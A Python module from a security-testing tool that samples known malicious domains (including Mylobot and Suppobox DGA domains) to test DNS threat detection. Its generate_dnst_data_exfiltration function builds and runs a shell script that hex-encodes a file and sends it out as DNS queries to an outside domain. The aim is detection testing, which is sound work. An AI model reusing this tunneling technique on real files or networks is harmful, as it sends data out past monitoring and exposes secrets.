"""
Threat Detection Simulator - Domain Sampler Module

This module handles intelligent domain sampling with TTL-based caching to ensure:
1. No duplicate domain sampling within TTL window (default 300 seconds)
2. Proper tracking of sampled vs queried vs detected domains
3. Clear audit trail of which domains disappear between stages

"""

import json
import random
import logging
import hashlib
import subprocess
import os
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple
from dataclasses import dataclass, asdict

logger = logging.getLogger(__name__)

# Supported threat categories based on v1 investigation
SUPPORTED_CATEGORIES = [
    "Phishing",
    "Lookalikes", 
    "TDS",
    "Command_&_Control",
    "DGAS_&_RDGAS",
    "Emerging_Domains",
    "High_Risk",
    "Malicious_Domains",
    "DGA_Malware",
    "DNST_Tunneling"
]

@dataclass
class DomainSample:
    """Represents a sampled domain with metadata"""
    domain: str
    category: str
    sampled_at: str
    last_used: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return asdict(self)

@dataclass 
class CategorySample:
    """Holds sampled domains for a specific threat category"""
    category: str
    domains: List[str]
    sampled_count: int
    sampled_at: str
    
    def to_dict(self) -> Dict:
        return asdict(self)

class DomainCache:
    """Manages TTL-based domain caching to prevent recent domain reuse"""
    
    def __init__(self, cache_file: str = "domain_cache.json", ttl_seconds: int = 300):
        self.cache_file = Path(cache_file)
        self.ttl_seconds = ttl_seconds
        self.cache: Dict[str, Dict[str, str]] = {}
        self._load_cache()
    
    def _load_cache(self) -> None:
        """Load existing cache or create new one"""
        try:
            if self.cache_file.exists():
                with open(self.cache_file, 'r') as f:
                    self.cache = json.load(f)
                logger.info(f"📦 Loaded domain cache from {self.cache_file}")
                self._log_cache_stats()
            else:
                logger.info(f"📦 Creating new domain cache at {self.cache_file}")
                self.cache = {category: {} for category in SUPPORTED_CATEGORIES}
                self._save_cache()
        except Exception as e:
            logger.error(f"❌ Error loading cache: {e}")
            self.cache = {category: {} for category in SUPPORTED_CATEGORIES}
    
    def _save_cache(self) -> None:
        """Save cache to disk"""
        try:
            self.cache_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f, indent=2)
            logger.debug(f"💾 Saved domain cache to {self.cache_file}")
        except Exception as e:
            logger.error(f"❌ Error saving cache: {e}")
    
    def _log_cache_stats(self) -> None:
        """Log cache statistics"""
        total_domains = sum(len(domains) for domains in self.cache.values())
        logger.info(f"📊 Cache contains {total_domains} domains across {len(self.cache)} categories")
        for category, domains in self.cache.items():
            if domains:
                logger.debug(f"   {category}: {len(domains)} cached domains")
    
    def is_domain_recent(self, domain: str, category: str) -> bool:
        """Check if domain was used recently within TTL window"""
        if category not in self.cache:
            return False
        
        domain_timestamp = self.cache[category].get(domain)
        if not domain_timestamp:
            return False
        
        try:
            last_used = datetime.fromisoformat(domain_timestamp)
            now = datetime.now(timezone.utc)
            age_seconds = (now - last_used).total_seconds()
            return age_seconds < self.ttl_seconds
        except Exception as e:
            logger.warning(f"⚠️ Error parsing timestamp for {domain}: {e}")
            return False
    
    def mark_domain_used(self, domain: str, category: str) -> None:
        """Mark domain as recently used"""
        if category not in self.cache:
            self.cache[category] = {}
        
        timestamp = datetime.now(timezone.utc).isoformat()
        self.cache[category][domain] = timestamp
        logger.debug(f"🕒 Marked {domain} as used in {category} at {timestamp}")
    
    def get_available_domains(self, domains: List[str], category: str) -> List[str]:
        """Filter out recently used domains from the list"""
        available = []
        filtered_count = 0
        
        for domain in domains:
            if not self.is_domain_recent(domain, category):
                available.append(domain)
            else:
                filtered_count += 1
                logger.debug(f"🚫 Filtered {domain} (used recently in {category})")
        
        if filtered_count > 0:
            logger.info(f"🔍 Filtered {filtered_count} recently used domains from {category}")
        
        return available
    
    def save(self) -> None:
        """Public method to save cache"""
        self._save_cache()

class ThreatDomainSampler:
    """Main sampler class that handles domain sampling with intelligent caching"""
    
    def __init__(self, 
                 indicators_file: str = "ib-base-category.json",
                 cache_file: str = "domain_cache.json", 
                 ttl_seconds: int = 300):
        self.indicators_file = Path(indicators_file)
        self.cache = DomainCache(cache_file, ttl_seconds)
        self.indicators: Dict[str, List[str]] = {}
        self.category_samples: Dict[str, CategorySample] = {}
        self.domain_mappings: Dict[str, str] = {}  # Maps query domains to expected threat event domains
        
        # Load the base indicators
        self._load_indicators()
        
        # Initialize category objects
        self._initialize_categories()
    
    def _load_indicators(self) -> None:
        """Load threat indicators from the base category file"""
        try:
            if not self.indicators_file.exists():
                raise FileNotFoundError(f"Indicators file not found: {self.indicators_file}")
            
            with open(self.indicators_file, 'r') as f:
                self.indicators = json.load(f)
            
            logger.info(f"📋 Loaded threat indicators from {self.indicators_file}")
            self._log_indicator_stats()
            
        except Exception as e:
            logger.error(f"❌ Error loading indicators: {e}")
            raise
    
    def _log_indicator_stats(self) -> None:
        """Log statistics about loaded indicators"""
        total_domains = sum(len(domains) for domains in self.indicators.values())
        logger.info(f"📊 Loaded {total_domains} domains across {len(self.indicators)} categories")
        
        for category, domains in self.indicators.items():
            logger.info(f"   {category}: {len(domains)} domains")
    
    def _initialize_categories(self) -> None:
        """Initialize empty category sample objects"""
        for category in SUPPORTED_CATEGORIES:
            self.category_samples[category] = CategorySample(
                category=category,
                domains=[],
                sampled_count=0,
                sampled_at=""
            )
        logger.info(f"🎯 Initialized {len(SUPPORTED_CATEGORIES)} category sample objects")
    
    def sample_domains(self, category: str, count: int, random_seed: Optional[int] = None, simulation_mode: bool = False) -> CategorySample:
        """
        Sample domains for a specific category, respecting TTL cache.
        Handles both static indicators from JSON and dynamic generation for DGA/DNST.
        
        Args:
            category: Threat category name
            count: Number of domains to sample
            random_seed: Optional seed for reproducible sampling
            
        Returns:
            CategorySample with sampled domains and metadata
        """
        if category not in SUPPORTED_CATEGORIES:
            raise ValueError(f"Unsupported category: {category}. Supported: {SUPPORTED_CATEGORIES}")
        
        # Set random seed if provided for reproducible results
        if random_seed is not None:
            random.seed(random_seed)
        
        timestamp = datetime.now(timezone.utc).isoformat()
        
        # Handle dynamic generation categories
        if category == "DGA_Malware":
            logger.info(f"🤖 Generating {count} DGA domains dynamically")
            domains = generate_dga_domains(count, seed=str(random_seed) if random_seed else "default")
            
            # Create domain mappings for DGA domains (Mylobot mapping)
            expected_threat_domains = get_expected_threat_domains_from_dga(domains)
            for query_domain, threat_domain in zip(domains, expected_threat_domains):
                if query_domain != threat_domain:  # Only map if different
                    self.domain_mappings[query_domain] = threat_domain
                    logger.debug(f"🔄 DGA mapping: {query_domain} → {threat_domain}")
            
            # Mark domains as used in cache (even though they're generated)
            for domain in domains:
                self.cache.mark_domain_used(domain, category)
            
            return CategorySample(category, domains, len(domains), timestamp)
        
        elif category == "DNST_Tunneling":
            logger.info("🔗 Generating DNST tunneling domain")
            # DNST typically uses one base domain that gets dynamically extended
            base_domain = "ladytisiphone.com"  # Standard DNST test domain
            
            if simulation_mode:
                # In simulation mode, generate a fake DNST domain without real DNS execution
                logger.info("🧪 SIMULATION MODE: Creating simulated DNST domain (no real DNS execution)")
                rand_alphnum = ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz') for _ in range(10))
                dnst_domain = f"scr.{rand_alphnum}.{base_domain}"
                logger.info(f"🎯 Simulated DNST domain: {dnst_domain}")
            else:
                # Execute real DNS tunneling - this is the whole point of threat detection testing
                logger.info("🔥 REAL MODE: Executing actual DNS tunneling (real DNS queries)")
                dnst_domain = generate_dnst_data_exfiltration(base_domain)
            
            # For DNST, we return the same domain multiple times as it's used repeatedly
            domains = [dnst_domain] * count
            
            # Mark as used in cache
            self.cache.mark_domain_used(dnst_domain, category)
            
            return CategorySample(category, domains, len(domains), timestamp)
        
        # Handle static indicator categories from JSON file
        if category not in self.indicators:
            logger.warning(f"⚠️ No indicators found for category: {category}")
            return CategorySample(category, [], 0, timestamp)
        
        # Special handling for DNST_Tunneling cache bypass (if using JSON indicators)
        if category == "DNST_Tunneling":
            logger.info("🔄 DNST_Tunneling: Bypassing cache (uses single domain repeatedly)")
            available_domains = self.indicators[category]
        else:
            available_domains = self.cache.get_available_domains(self.indicators[category], category)
        
        if len(available_domains) < count:
            if category == "DNST_Tunneling":
                logger.info(f"ℹ️ DNST_Tunneling: Only {len(available_domains)} domain(s) available, "
                           f"will repeat as needed for {count} samples")
            else:
                logger.warning(f"⚠️ Only {len(available_domains)} available domains for {category}, "
                              f"requested {count}. Consider increasing TTL or waiting.")
        
        # Sample requested number of domains (or all available if less)
        if category == "DNST_Tunneling" and len(available_domains) > 0:
            # For DNST_Tunneling, repeat the domain(s) to reach requested count
            sampled_domains = []
            for i in range(count):
                sampled_domains.append(available_domains[i % len(available_domains)])
        else:
            sample_count = min(count, len(available_domains))
            sampled_domains = random.sample(available_domains, sample_count) if sample_count > 0 else []
        
        # Mark sampled domains as used (skip for DNST_Tunneling since it reuses domains)
        if category != "DNST_Tunneling":
            for domain in sampled_domains:
                self.cache.mark_domain_used(domain, category)
        
        # Create sample object
        sample = CategorySample(
            category=category,
            domains=sampled_domains,
            sampled_count=len(sampled_domains),
            sampled_at=datetime.now(timezone.utc).isoformat()
        )
        
        # Store in category samples
        self.category_samples[category] = sample
        
        logger.info(f"🎲 Sampled {len(sampled_domains)} domains for {category}")
        
        return sample
    
    def sample_all_categories(self, count_per_category: int, 
                            categories: Optional[List[str]] = None,
                            random_seed: Optional[int] = None) -> Dict[str, CategorySample]:
        """
        Sample domains for all categories or specified subset
        
        Args:
            count_per_category: Number of domains to sample per category
            categories: Optional list of specific categories to sample
            random_seed: Optional seed for reproducible sampling
            
        Returns:
            Dictionary mapping category names to CategorySample objects
        """
        target_categories = categories if categories else SUPPORTED_CATEGORIES
        results = {}
        
        logger.info(f"🎯 Sampling {count_per_category} domains each for {len(target_categories)} categories")
        
        for category in target_categories:
            try:
                sample = self.sample_domains(category, count_per_category, random_seed)
                results[category] = sample
            except Exception as e:
                logger.error(f"❌ Error sampling {category}: {e}")
                results[category] = CategorySample(category, [], 0, datetime.now(timezone.utc).isoformat())
        
        # Save cache after all sampling
        self.cache.save()
        
        return results
    
    def get_category_domains(self, category: str) -> List[str]:
        """Get the currently sampled domains for a category"""
        if category in self.category_samples:
            return self.category_samples[category].domains.copy()
        return []
    
    def get_all_sampled_domains(self) -> Dict[str, List[str]]:
        """Get all currently sampled domains by category"""
        return {cat: sample.domains.copy() for cat, sample in self.category_samples.items()}
    
    def export_samples_to_json(self, output_file: str) -> None:
        """Export all category samples to JSON file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            export_data = {
                "export_timestamp": datetime.now(timezone.utc).isoformat(),
                "ttl_seconds": self.cache.ttl_seconds,
                "categories": {cat: sample.to_dict() for cat, sample in self.category_samples.items()}
            }
            
            with open(output_path, 'w') as f:
                json.dump(export_data, f, indent=2)
            
            logger.info(f"📤 Exported samples to {output_path}")
            
        except Exception as e:
            logger.error(f"❌ Error exporting samples: {e}")
    
    def get_sampling_summary(self) -> Dict:
        """Get summary of current sampling state"""
        total_sampled = sum(sample.sampled_count for sample in self.category_samples.values())
        categories_with_samples = sum(1 for sample in self.category_samples.values() if sample.sampled_count > 0)
        
        return {
            "total_domains_sampled": total_sampled,
            "categories_sampled": categories_with_samples,
            "total_categories": len(SUPPORTED_CATEGORIES),
            "category_breakdown": {
                cat: {
                    "sampled_count": sample.sampled_count,
                    "sampled_at": sample.sampled_at
                } for cat, sample in self.category_samples.items()
            }
        }
    
    def get_domain_mappings(self) -> Dict[str, str]:
        """
        Get domain mappings for threat event correlation.
        Maps query domains to expected threat event domains (mainly for DGA).
        
        Returns:
            Dictionary mapping query domain to expected threat event domain
        """
        return self.domain_mappings.copy()
    
    def get_expected_threat_domain(self, query_domain: str) -> str:
        """
        Get the expected threat event domain for a given query domain.
        Returns the mapped domain if exists, otherwise the original domain.
        
        Args:
            query_domain: Domain used in DNS queries
            
        Returns:
            Expected domain in threat events
        """
        return self.domain_mappings.get(query_domain, query_domain)

# Convenience functions for direct usage
def sample_domains_for_category(category: str, count: int, 
                               indicators_file: str = "ib-base-category.json",
                               cache_file: str = "domain_cache.json",
                               ttl_seconds: int = 300,
                               random_seed: Optional[int] = None) -> List[str]:
    """Convenience function to sample domains for a single category"""
    sampler = ThreatDomainSampler(indicators_file, cache_file, ttl_seconds)
    sample = sampler.sample_domains(category, count, random_seed)
    return sample.domains

def create_category_objects(sampler: ThreatDomainSampler, 
                          count_per_category: int = 50,
                          random_seed: Optional[int] = None) -> Dict[str, CategorySample]:
    """
    Create category objects with sampled domains for all supported categories
    
    Args:
        sampler: ThreatDomainSampler instance to use
        count_per_category: Number of domains to sample per category
        random_seed: Optional seed for reproducible sampling
    
    Returns dictionary with category names as keys and CategorySample objects as values
    """
    results = sampler.sample_all_categories(count_per_category, random_seed=random_seed)
    return results


def generate_dga_domains(count: int = 10, seed: str = "test") -> List[str]:
    """
    Generate Domain Generation Algorithm (DGA) domains for testing.
    Uses actual DGA domains from known malware families instead of generating random ones.
    
    Args:
        count (int): Number of DGA domains to return (will sample from available domains)
        seed (str): Seed for domain selection (used for reproducible sampling)
        
    Returns:
        List[str]: List of actual DGA domains from malware families
    """
    try:
        logger.info(f"🔧 Selecting {count} DGA domains from known malware families")
        
        # Actual DGA domains from known malware families
        
        # DGA Mylobot domains (original format with m prefix)
        mylobot_domains = [
            "m14.jospife.ru",
            "m0.qnbwqfs.com", 
            "m41.kumswgx.net",
            "m11.puhurku.net",
            "m37.carscwa.net",
            "m38.qwaecal.ru",
            "m12.hktjdxi.net",
            "m0.scnixpn.com",
            "m27.udtlxsc.ru",
            "m10.efjybch.com",
            "m35.bwuskfu.net",
            "m9.bglixqu.com",
            "m25.bqeaeqq.net",
            "m0.zbrtimi.net",
            "m11.liewxwx.com"
        ]
        
        # DGA Suppobox domains
        suppobox_domains = [
            "viewserve.ru",
            "sylvestercherokee.ru",
            "radclyffeannabeth.net",
            "severalgeneral.ru"
        ]
        
        # Combine all DGA domains
        all_dga_domains = mylobot_domains + suppobox_domains
        
        # Use seed for reproducible selection
        date_seed = datetime.now().strftime("%Y%m%d") + seed
        random.seed(hashlib.md5(date_seed.encode()).hexdigest())
        
        # Sample domains based on requested count
        if count >= len(all_dga_domains):
            selected_domains = all_dga_domains
            logger.info(f"✅ Selected all {len(all_dga_domains)} available DGA domains")
        else:
            selected_domains = random.sample(all_dga_domains, count)
            logger.info(f"✅ Selected {len(selected_domains)} DGA domains from {len(all_dga_domains)} available")
        
        logger.info("🎯 DGA domains selected for DNS queries:")
        for i, domain in enumerate(selected_domains, 1):
            logger.info(f"   {i:2}. {domain}")
        
        logger.info("ℹ️  Note: Mylobot domains will appear in threat events without 'm##.' prefix")
        logger.info("    Example: m14.jospife.ru → jospife.ru in threat events")
        
        return selected_domains
        
    except Exception as e:
        logger.error(f"❌ Error selecting DGA domains: {e}")
        return []


def get_expected_threat_domains_from_dga(dga_domains: List[str]) -> List[str]:
    """
    Convert DGA domains to their expected format in threat events.
    Mylobot domains drop the first 3 characters (m##.) in threat events.
    
    Args:
        dga_domains (List[str]): Original DGA domains used for DNS queries
        
    Returns:
        List[str]: Expected domain formats in threat events
    """
    expected_domains = []
    
    for domain in dga_domains:
        if domain.startswith('m') and '.' in domain:
            # Mylobot format: m##.domain.tld → domain.tld
            parts = domain.split('.', 1)
            if len(parts) > 1 and len(parts[0]) == 3 and parts[0][0] == 'm':
                expected_domain = parts[1]  # Remove m##. prefix
                expected_domains.append(expected_domain)
                logger.debug(f"🔄 Mylobot mapping: {domain} → {expected_domain}")
            else:
                expected_domains.append(domain)
        else:
            # Suppobox and other formats remain the same
            expected_domains.append(domain)
    
    return expected_domains


def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "", dns_server: str = "169.254.169.254") -> str:
    """
    Generate DNS tunneling (DNST) test data for threat detection.
    
    This function ACTUALLY EXECUTES DNS queries to create real DNS tunneling traffic
    that can be detected by threat detection systems. This is the whole point -
    to generate real threat indicators, not simulations.
    
    Args:
        domain (str): Domain to use for DNS tunneling (default: ladytisiphone.com)
        anycast_ip (str): Anycast IP to use for DNS queries (empty for default)
        dns_server (str): DNS server to use for queries (default: 169.254.169.254)
        
    Returns:
        str: The generated DNST domain used for tunneling (base domain for threat correlation)
        
    Note:
        This function executes real DNS queries. If your environment doesn't support
        this (firewalls, DNS restrictions, etc.), then DNST testing is not possible
        in that environment. Don't fake it with simulations.
    """
    try:
        logger.info(f"🔧 Generating DNST (DNS Tunneling) test data for domain: {domain}")
        logger.info("� Executing REAL DNS queries to generate threat traffic")
        
        # Create data file to use for tunneling detection
        subprocess.getstatusoutput('rm -rf test_exfiltration.txt domain_add.sh')
        
        # Generate random test data for exfiltration
        data_file = open("test_exfiltration.txt", "w+")
        for _ in range(120):
            data_file.write(
                ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz!@#$%^*') for _ in range(16)) + "\n")
        data_file.close()
        
        # Generate random identifiers for the tunneling session
        rand_chars = ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz') for _ in range(8))
        rand_alphnum = ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz') for _ in range(10))
        
        # Construct DNST domain names
        domain_start = str(rand_chars) + '.txt.0.start.scr.' + str(rand_alphnum) + '.' + domain
        domain_stop = str(rand_chars) + '.txt.0.stop.scr.' + str(rand_alphnum) + '.' + domain
        dnst_domain = str(rand_chars) + '.scr.' + str(rand_alphnum) + '.' + domain
        
        # The threat event will contain the base DNST domain (without the random prefix)
        # Example: full query is "vj3ljema.scr.r3kwv100xw.ladytisiphone.com"
        # but threat indicator will be "scr.r3kwv100xw.ladytisiphone.com"
        threat_base_domain = 'scr.' + str(rand_alphnum) + '.' + domain
        
        logger.info(f"🚀 Executing REAL DNST tunneling for domain: {dnst_domain}")
        logger.info(f"🎯 Expected threat indicator domain: {threat_base_domain}")
        logger.warning("⚠️  This will generate REAL DNS traffic for threat detection testing!")
        
        # Create exfiltration script
        fh = open("domain_add.sh", "w+")
        
        # Construct dig commands based on dns_server parameter
        if dns_server and dns_server.lower() != 'legacy':
            dns_option = f' {dns_server}'
        else:
            dns_option = ''
        
        data = f'if [ ! -e "test_exfiltration.txt" ]; then echo "File does not exists"; else i=0;host -t A ' \
               f'646e735f31302e747874.1.{domain_start}{dns_option}; hexdump -e \'27/1 "%02x" "\\n"\' ' \
               f'"test_exfiltration.txt" | (while read line; do host -t A $line"."$i".{dnst_domain}"{dns_option};i=$(($i+1)) ' \
               f'; done ; host -t A 646e735f31302e747874.1.{domain_stop}{dns_option}; echo \'Segments sent: \' ' \
               f'$i); fi'
        fh.write(data)
        fh.close()
        
        # Execute the DNST tunneling - THIS IS THE REAL DNS TRAFFIC GENERATION
        logger.info("📡 Executing DNS tunneling script (REAL DNS QUERIES)...")
        subprocess.call(['sh', './domain_add.sh'])
        
        # Cleanup temporary files
        try:
            os.remove('test_exfiltration.txt')
            os.remove('domain_add.sh')
        except OSError:
            pass
        
        logger.info("✅ Real DNST execution completed.")
        logger.info(f"   Full query domain: {dnst_domain}")
        logger.info(f"   Threat indicator: {threat_base_domain}")
        
        # Return the threat base domain for accurate threat log correlation
        return threat_base_domain
        
    except Exception as e:
        logger.error(f"❌ Error generating DNST data: {e}")
        logger.error("💡 If DNS queries are blocked in your environment, DNST testing is not possible.")
        logger.error("💡 Consider running in an environment with DNS access or skip DNST category.")
        return f"error.{domain}"


if __name__ == "__main__":
    # Example usage
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    # Create sampler
    sampler = ThreatDomainSampler()
    
    # Sample 50 domains per category (standard default)
    results = sampler.sample_all_categories(50)
    
    # Print summary
    summary = sampler.get_sampling_summary()
    print("\n📊 Sampling Summary:")
    print(f"Total domains sampled: {summary['total_domains_sampled']}")
    print(f"Categories with samples: {summary['categories_sampled']}/{summary['total_categories']}")
    
    # Export results
    sampler.export_samples_to_json("sampled_domains.json")
    
    # Test DGA generation
    print("\n🤖 Testing DGA domain generation:")
    dga_domains = generate_dga_domains(5, "test")
    expected_domains = get_expected_threat_domains_from_dga(dga_domains)
    
    # Test DNST generation
    print("\n🔗 Testing DNST data exfiltration:")
    dnst_domain = generate_dnst_data_exfiltration("testdomain.com", dns_server="8.8.8.8")
